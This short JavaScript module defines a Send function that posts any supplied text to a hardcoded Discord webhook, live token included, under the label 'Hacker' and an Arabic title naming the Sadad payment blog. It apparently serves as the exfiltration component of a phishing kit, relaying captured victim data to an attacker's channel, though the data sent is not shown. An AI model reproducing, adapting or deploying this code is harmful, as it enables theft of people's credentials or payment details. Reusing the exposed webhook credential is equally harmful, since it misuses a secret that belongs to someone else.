import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1322126530595393578/W9YY8aE0odju8a9ySBOUDoOjo_C6kHAw5tbqsevibDR5jrryQj9kEW1nw-U5IWJA6e0W",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
